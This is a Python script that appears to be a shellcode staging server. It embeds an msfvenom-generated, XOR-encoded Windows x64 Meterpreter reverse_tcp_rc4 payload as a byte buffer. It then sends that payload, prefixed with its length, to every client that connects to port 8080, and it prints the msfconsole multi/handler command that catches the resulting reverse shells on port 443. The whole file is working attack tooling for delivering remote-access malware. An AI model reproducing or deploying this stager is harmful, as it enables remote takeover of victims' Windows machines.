import socket
import subprocess

#msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 LHOST=eth0 LPORT=443 -e x64/xor -f py
buf =  b""
buf += b"\x48\x31\xc9\x48\x81\xe9\xae\xff\xff\xff\x48\x8d"
buf += b"\x05\xef\xff\xff\xff\x48\xbb\xef\x8d\xae\x0a\xb3"
buf += b"\x73\x37\x93\x48\x31\x58\x27\x48\x2d\xf8\xff\xff"
buf += b"\xff\xe2\xf4\x13\xc5\x2d\xee\x43\x9b\xfb\x93\xef"
buf += b"\x8d\xef\x5b\xf2\x23\x65\xdb\xde\x5f\xcb\x42\x38"
buf += b"\x21\x57\xdb\x64\xdf\xb6\x42\x38\x21\x17\xc2\xb9"
buf += b"\xc0\x9f\xc3\xfb\x7c\x80\xd9\xa5\xc5\x25\x78\xe3"
buf += b"\x3b\x06\x53\x43\xb1\xcf\x76\xb1\x5f\x17\xd2\x2e"
buf += b"\x44\xa3\x4b\xb2\xb2\xd5\x7e\xbd\xcc\xff\x42\x38"
buf += b"\x21\x17\x18\xad\xb1\xe6\x0b\x63\x15\xb6\xeb\xf7"
buf += b"\x86\xac\x05\x36\x01\x37\x93\xef\x06\x2e\x82\xb3"
buf += b"\x73\x37\xdb\x6a\x4d\xda\x6d\xfb\x72\xe7\xc3\xab"
buf += b"\x06\xee\x2a\x38\x3b\x2f\xda\xee\x5d\x4d\x5c\xfe"
buf += b"\x42\xfe\xdb\x10\x44\xef\x81\x87\xfb\x7f\x92\x39"
buf += b"\xc5\x9f\xca\xf2\xb2\xfe\x9e\x43\xcc\xaf\xcb\x8b"
buf += b"\x93\x42\x62\xa3\x8e\xe2\x2e\xbb\x36\x0e\x42\x9a"
buf += b"\x55\xf6\x4e\x38\x33\x13\xda\xee\x5d\xc8\x4b\x38"
buf += b"\x7f\x7f\xd7\x64\xcd\xb2\x43\xb2\xa3\x76\x18\xeb"
buf += b"\x05\xef\x52\xfb\x72\xe7\xd2\xb7\xd3\xf7\x50\xf2"
buf += b"\x2b\x76\xca\xae\xd7\xe6\x89\x5f\x53\x76\xc1\x10"
buf += b"\x6d\xf6\x4b\xea\x29\x7f\x18\xfd\x64\xe5\xf5\x4c"
buf += b"\x8c\x6a\xda\x51\xfa\xdd\x38\xec\x40\x05\x93\xef"
buf += b"\xcc\xf8\x43\x3a\x95\x7f\x12\x03\x2d\xaf\x0a\xb3"
buf += b"\x3a\xbe\x76\xa6\x31\xac\x0a\xb2\xc8\xf7\x3b\xa8"
buf += b"\x0c\xef\x5e\xfa\xfa\xd3\xdf\x66\x7c\xef\xb0\xff"
buf += b"\x04\x11\x94\x10\x58\xe2\x83\x59\x1b\x36\x92\xef"
buf += b"\x8d\xf7\x4b\x09\x5a\xb7\xf8\xef\x72\x7b\x60\xb9"
buf += b"\x32\x69\xc3\xbf\xc0\x9f\xc3\xfe\x42\xf7\xdb\x10"
buf += b"\x4d\xe6\x83\x71\x3b\xc8\x53\xa7\x04\x6f\x4b\x09"
buf += b"\x99\x38\x4c\x0f\x72\x7b\x42\x3a\xb4\x5d\x83\xae"
buf += b"\xd5\xe2\x83\x51\x3b\xbe\x6a\xae\x37\x37\xaf\xc7"
buf += b"\x12\xc8\x46\x6a\x4d\xda\x00\xfa\x8c\xf9\xe6\x0a"
buf += b"\x65\xb1\x0b\xb3\x73\x7f\x10\x03\x9d\xe6\x83\x51"
buf += b"\x3e\x06\x5a\x85\x89\xef\x52\xfb\xfa\xce\xd2\x55"
buf += b"\x8f\x77\xc2\xec\x8c\xe2\x10\x17\x8d\xa1\x84\xde"
buf += b"\x73\x37\x93\xa7\x0e\x6a\x2a\xed\xfa\xc1\x12\x19"
buf += b"\x2d\xab\xa8\x60\x3f\xba\x0d\xef\x8c\xae\x0a\xd9"
buf += b"\x33\x76\xca\x87\x8d\xbe\x0a\xb3\x32\x6f\xdb\x66"
buf += b"\x7f\xe6\x3b\x7a\x32\x8d\xcb\x4b\xde\x4b\xf5\x66"
buf += b"\x3b\xba\x0b\xef\x8c\xae\x0a\xfa\xfa\xe8\xc0\xb9"
buf += b"\xdd\xe3\x3b\x7a\x3a\xbe\x63\xa7\x04\x74\x42\x3a"
buf += b"\x8a\x76\x29\xed\x54\x66\x55\x4c\xa6\x7f\x10\x2b"
buf += b"\xad\x2d\xf2\xb3\x0e\x1f\xcb\xae\xda\xf7\x62\xb3"
buf += b"\x33\x37\x93\xae\xd5\xc4\x0a\xe9\x32\x8d\x98\xc0"
buf += b"\x82\x9e\xf5\x66\x24\x6e\xd2\x55\xf8\xc0\x47\xd2"
buf += b"\x8c\xe2\xda\x10\x43\x47\x2a\x4c\x8c\xc8\xdb\xee"
buf += b"\x4e\xe6\x23\x75\x06\x84\xda\x66\x73\xf1\x53\xf2"
buf += b"\x2a\x76\xc5\x07\x9d\xae\x0a\xb3\x47\x1d\xfb\x91"
buf += b"\x2f\x7e\x59\xd3\xba\x64\x83\x95\x46\x46\x34\xbb"
buf += b"\x2d\x7f\xa2\x2f\xc4\x27\xf2\x19\x8d\xf7\xe6\x14"
buf += b"\xc5\x9f\xd1\xf2\x71\x2b\x93\xa7\x04\x6c\x8a\x51"
buf += b"\x7c\x35\x8f\xf9\xcc\x24\x1e\xb3\x32\xb1\x87\xf7"
buf += b"\xcc\x26\x1e\xb3\x8d\xf7\xe6\x0c\xc5\x9f\xd1\x4d"
buf += b"\xb3\x76\x91\xf3\x8d\xef\x80\xa7\x73\x76\x15\xfb"
buf += b"\x95\xef\x82\xa7\x73\x76\x91\xfb\x95\xef\x80\xa7"
buf += b"\x63\x76\xa3\xfe\xc4\x51\xcb\xfb\x8c\xfe\xe6\x34"
buf += b"\xd2\xef\xf5\x54\x2b\x5d\x93\xb6\xc4\x69\xc8\x43"
buf += b"\xc6\x95\xc5\x10\x58\xae\x0a\xb3\x73\x37\x93"

#OR
#buf = (subprocess.check_output(['msfvenom','-p','windows/x64/meterpreter/reverse_tcp_rc4','LHOST=eth0', 'LPORT=443', '-e', 'x64/xor', '-f', 'raw']))

print("-"*80)
print('msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp_rc4; set lport 443; set lhost eth0; set exitonsession false; exploit -j"')
print("-"*80)


print("Size of stager shellcode: " + str(len(buf)))
stgrSize = len(buf).to_bytes(4, 'little')

HOST = "0.0.0.0"
PORT = 8080

while True:
	try:
		with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
			s.bind((HOST, PORT))
			s.listen()
			conn, addr = s.accept()
			with conn:
				print(f"Got connection from {addr}")
				while True:
					data = stgrSize + buf
					conn.sendall(data)
	except:
		pass